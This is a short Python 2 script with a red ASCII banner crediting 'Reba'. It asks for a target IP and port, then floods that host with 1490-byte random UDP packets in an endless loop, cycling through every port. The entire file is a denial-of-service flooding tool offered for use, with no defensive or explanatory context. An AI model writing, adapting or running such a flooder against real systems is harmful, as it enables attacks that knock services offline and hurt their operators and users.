print ("\033[1;31m")
import sys
import os
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system('clear')
os.system("clear")
def reba_logo():
	logo = """ \n\033[1;31m  _______     ______    ______     _______ \n\033[1;31m (  ____ )  (  ____ \  (  ___ \   (  ___  )\n | (    )|  | (    \/  | (   ) )  | (   ) |\n\033[1;31m | (____)|  | (__      | (__/ /   | (___) |\n |     __)  |  __)     |  __ (    |  ___  |\n\033[1;31m | (\ (     | (        | (  \ \   | (   ) |\n | ) \ \__  | (____/\  | )___) )  | )   ( |\n\033[1;31m |/   \__/  (_______/  |/ \___/   |/     \|\n\033[1;31m--------------------------------------------------\n\033[1;33mCOD BY Reba  """
	print(logo)
print
print
ip = raw_input("IP DANE : ")
port = input("Port       : ")
print("\033[93m")
print ("\033[92m")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
